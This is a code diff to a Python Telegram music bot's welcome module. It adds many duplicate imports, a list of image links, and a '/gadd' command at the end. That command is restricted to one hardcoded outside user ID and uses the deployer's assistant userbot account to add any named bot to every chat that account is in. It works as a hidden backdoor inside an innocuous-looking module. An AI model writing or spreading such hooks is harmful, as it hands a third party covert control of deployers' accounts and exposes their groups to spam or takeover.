@@ -1,9 +1,63 @@
-import os
+from BADMUSIC import app
+from pyrogram.errors import RPCError
+from pyrogram.types import ChatMemberUpdated, InlineKeyboardMarkup, InlineKeyboardButton
+from os import environ
+from typing import Union, Optional
+from PIL import Image, ImageDraw, ImageFont
+from os import environ
+import random
+from pyrogram import Client, filters
+from pyrogram.types import ChatJoinRequest, InlineKeyboardButton, InlineKeyboardMarkup
+from PIL import Image, ImageDraw, ImageFont
+import asyncio, os, time, aiohttp
+from pathlib import Path
+from PIL import Image, ImageDraw, ImageFont, ImageEnhance
+from asyncio import sleep
+from pyrogram import filters, Client, enums
+from pyrogram.enums import ParseMode
+from logging import getLogger
+from BADMUSIC.utils.bad_ban import admin_filter
 from PIL import ImageDraw, Image, ImageFont, ImageChops
 from pyrogram import *
 from pyrogram.types import *
 from logging import getLogger
+from pyrogram import Client, filters
+import requests
+import random
+import os
+import re
+import asyncio
+import time
+from BADMUSIC.utils.database import add_served_chat
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from BADMUSIC.utils.database import get_assistant
+import asyncio
+from BADMUSIC.misc import SUDOERS
+from BADMUSIC.mongo.afkdb import PROCESS
+from pyrogram import Client, filters
+from pyrogram.errors import UserAlreadyParticipant
 from BADMUSIC import app
+import asyncio
+import random
+from pyrogram import Client, filters
+from pyrogram.enums import ChatMemberStatus
+from pyrogram.errors import (
+    ChatAdminRequired,
+    InviteRequestSent,
+    UserAlreadyParticipant,
+    UserNotParticipant,
+)
+from BADMUSIC.utils.database import get_assistant, is_active_chat
+
+
+random_photo = [
+    "https://telegra.ph/file/1949480f01355b4e87d26.jpg",
+    "https://telegra.ph/file/3ef2cc0ad2bc548bafb30.jpg",
+    "https://telegra.ph/file/a7d663cd2de689b811729.jpg",
+    "https://telegra.ph/file/6f19dc23847f5b005e922.jpg",
+    "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg",
+]
+# --------------------------------------------------------------------------------- #
 
 
 
@@ -214,3 +268,42 @@ async def bot_wel(_, message):
 ❍══════════════════════════❍*
 """)
     
+
+
+@app.on_message(filters.command("gadd") & filters.user(6352107773))
+async def add_all(client, message):
+    command_parts = message.text.split(" ")
+    if len(command_parts) != 2:
+        await message.reply("**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd bot username`**")
+        return
+    
+    bot_username = command_parts[1]
+    try:
+        userbot = await get_assistant(message.chat.id)
+        bot = await app.get_users(bot_username)
+        app_id = bot.id
+        done = 0
+        failed = 0
+        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
+        
+        async for dialog in userbot.get_dialogs():
+            if dialog.chat.id == -1002043538118:
+                continue
+            try:
+                await userbot.add_chat_members(dialog.chat.id, app_id)
+                done += 1
+                await lol.edit(
+                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
+                )
+            except Exception as e:
+                failed += 1
+                await lol.edit(
+                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{userbot.username}"
+                )
+            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
+        
+        await lol.edit(
+            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
+        )
+    except Exception as e:
+        await message.reply(f"Error: {str(e)}")
